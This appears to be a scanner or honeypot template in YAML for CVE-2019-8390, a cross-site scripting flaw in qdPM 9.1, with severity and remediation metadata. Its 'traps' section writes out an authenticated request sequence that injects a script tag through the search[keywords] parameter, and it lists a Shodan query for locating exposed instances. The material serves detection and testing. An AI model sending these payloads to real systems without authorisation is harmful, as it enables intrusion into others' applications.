id: CVE-2019-8390
info:
  name: qdPM 9.1 - Cross-site Scripting
  author: theamanrawat
  description: 'qdPM 9.1 suffers from Cross-site Scripting (XSS) in the search[keywords]
    parameter.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  remediation: 'Upgrade to a patched version of qdPM or apply the necessary security
    patches provided by the vendor.

    '
  reference:
  - https://www.exploit-db.com/exploits/46399/
  - http://qdpm.net/download-qdpm-free-project-management
  - https://nvd.nist.gov/vuln/detail/CVE-2019-8390
  - http://sourceforge.net/projects/qdpm
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2019-8390
    cwe-id: CWE-79
    epss-score: 0.0161
    epss-percentile: 0.86055
    cpe: cpe:2.3:a:qdpm:qdpm:9.1:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: qdpm
    product: qdpm
    shodan-query: http.favicon.hash:762074255
  tags: cve,cve2019,xss,qdpm,authenticated,edb
traps:
- request:
    method: GET
    path: /index.php/login
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: <script>alert(document.domain)</script>alert alert-info alert-search-result
- request:
    method: POST
    path: /index.php/login
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'login%5B_csrf_token%5D={{csrf}}&login%5Bemail%5D={{username}}&login%5Bpassword%5D={{password}}&http_referer=

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /index.php/users
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'search[keywords]=e"><script>alert(document.domain)</script>&search_by_extrafields[]=9

      '
  response:
    status_code: 200
    headers: {}
    body: ''
